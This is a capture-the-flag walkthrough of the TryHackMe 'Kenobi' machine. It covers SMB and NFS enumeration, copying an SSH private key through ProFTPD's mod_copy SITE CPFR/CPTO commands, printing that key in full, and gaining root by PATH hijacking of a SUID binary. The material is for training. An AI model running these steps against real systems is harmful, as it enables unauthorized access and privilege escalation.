https://tryhackme.com/room/kenobi


ip = `10.10.30.93`

# open ports

21/tcp    open  ftp         ProFTPD 1.3.5
22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
111/tcp   open  rpcbind     2-4 (RPC #100000)                                                                                                                
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)                                                                                      
445/tcp   open  �Y�,�U      Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)                                                                                  
2049/tcp  open  nfs_acl     2-3 (RPC #100227)                                                                                                                
39743/tcp open  nlockmgr    1-4 (RPC #100021)
51463/tcp open  mountd      1-3 (RPC #100005)
52213/tcp open  mountd      1-3 (RPC #100005)
58015/tcp open  mountd      1-3 (RPC #100005)



# findings


## Samda

`nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.30.93`
returns all shared drives


`smbclient //10.10.30.93/anonymous`
connects to one - there is log.txt file there

managed to download log.txt using `smbget -r smb://10.10.30.93/anonymous/log.txt`

The key fingerprint is:
SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi





## 111
```
┌──(kali㉿kali)-[~]
└─$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.30.93
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-01 05:59 EST
Nmap scan report for 10.10.30.93
Host is up (0.064s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *
```

Lets copy home/kenobi/.ssh/id_rsa to that mount point using ftp

```
┌──(kali㉿kali)-[~]
└─$ nc 10.10.30.93 21                                                                                                         
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.30.93]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

Now lets mount to that /var and see what is there 


```
sudo mkdir /mnt/kenobiNFS
sudo mount 10.10.30.93:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS

┌──(kali㉿kali)-[~]
└─$ cat /mnt/mountKenobi/tmp/id_rsa                                                                                                                      
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA4PeD0e0522UEj7xlrLmN68R6iSG3HMK/aTI812CTtzM9gnXs
qpweZL+GJBB59bSG3RTPtirC3M9YNTDsuTvxw9Y/+NuUGJIq5laQZS5e2RaqI1nv
U7fXEQlJrrlWfCy9VDTlgB/KRxKerqc42aU+/BrSyYqImpN6AgoNm/s/753DEPJt
dwsr45KFJOhtaIPA4EoZAq8pKovdSFteeUHikosUQzgqvSCv1RH8ZYBTwslxSorW
y3fXs5GwjitvRnQEVTO/GZomGV8UhjrT3TKbPhiwOy5YA484Lp3ES0uxKJEnKdSt
otHFT4i1hXq6T0CvYoaEpL7zCq7udl7KcZ0zfwIDAQABAoIBAEDl5nc28kviVnCI
ruQnG1P6eEb7HPIFFGbqgTa4u6RL+eCa2E1XgEUcIzxgLG6/R3CbwlgQ+entPssJ
dCDztAkE06uc3JpCAHI2Yq1ttRr3ONm95hbGoBpgDYuEF/j2hx+1qsdNZHMgYfqM
bxAKZaMgsdJGTqYZCUdxUv++eXFMDTTw/h2SCAuPE2Nb1f1537w/UQbB5HwZfVry
tRHknh1hfcjh4ZD5x5Bta/THjjsZo1kb/UuX41TKDFE/6+Eq+G9AvWNC2LJ6My36
YfeRs89A1Pc2XD08LoglPxzR7Hox36VOGD+95STWsBViMlk2lJ5IzU9XVIt3EnCl
bUI7DNECgYEA8ZymxvRV7yvDHHLjw5Vj/puVIQnKtadmE9H9UtfGV8gI/NddE66e
t8uIhiydcxE/u8DZd+mPt1RMU9GeUT5WxZ8MpO0UPVPIRiSBHnyu+0tolZSLqVul
rwT/nMDCJGQNaSOb2kq+Y3DJBHhlOeTsxAi2YEwrK9hPFQ5btlQichMCgYEA7l0c
dd1mwrjZ51lWWXvQzOH0PZH/diqXiTgwD6F1sUYPAc4qZ79blloeIhrVIj+isvtq
mgG2GD0TWueNnddGafwIp3USIxZOcw+e5hHmxy0KHpqstbPZc99IUQ5UBQHZYCvl
SR+ANdNuWpRTD6gWeVqNVni9wXjKhiKM17p3RmUCgYEAp6dwAvZg+wl+5irC6WCs
dmw3WymUQ+DY8D/ybJ3Vv+vKcMhwicvNzvOo1JH433PEqd/0B0VGuIwCOtdl6DI9
u/vVpkvsk3Gjsyh5gFI8iZuWAtWE5Av4OC5bwMXw8ZeLxr0y1JKw8ge9NSDl/Pph
YNY61y+DdXUvywifkzFmhYkCgYB6TeZbh9XBVg3gyhMnaQNzDQFAUlhM7n/Alcb7
TjJQWo06tOlHQIWi+Ox7PV9c6l/2DFDfYr9nYnc67pLYiWwE16AtJEHBJSHtofc7
P7Y1PqPxnhW+SeDqtoepp3tu8kryMLO+OF6Vv73g1jhkUS/u5oqc8ukSi4MHHlU8
H94xjQKBgExhzreYXCjK9FswXhUU9avijJkoAsSbIybRzq1YnX0gSewY/SB2xPjF
S40wzYviRHr/h0TOOzXzX8VMAQx5XnhZ5C/WMhb0cMErK8z+jvDavEpkMUlR+dWf
Py/CLlDCU4e+49XBAPKEmY4DuN+J2Em/tCz7dzfCNS/mpsSEn0jo
-----END RSA PRIVATE KEY-----
```

Now we can ssh to it as kenobi

```
ssh kenobi@10.10.30.93 -i id_rsa_kenobi 
kenobi@kenobi:~$ cat user.txt 
<flag>
```

Lets look for files with SUID bit

```
kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu -> what is this?
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```

Lets see what can we do with /usr/bin/menu using strings

```
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost -> this is interesting
uname -r
ifconfig
```
the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname) -> this file runs as root

lets try and exploit curl

```

kenobi@kenobi:~$ cd /tmp/
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# whoami
root
# ls
curl  systemd-private-a12ee0a061f142269b8b861423f208ca-systemd-timesyncd.service-5ex1GQ
# cd /root
# ls
root.txt
# cat root.txt  
<flag>


```

DONE!

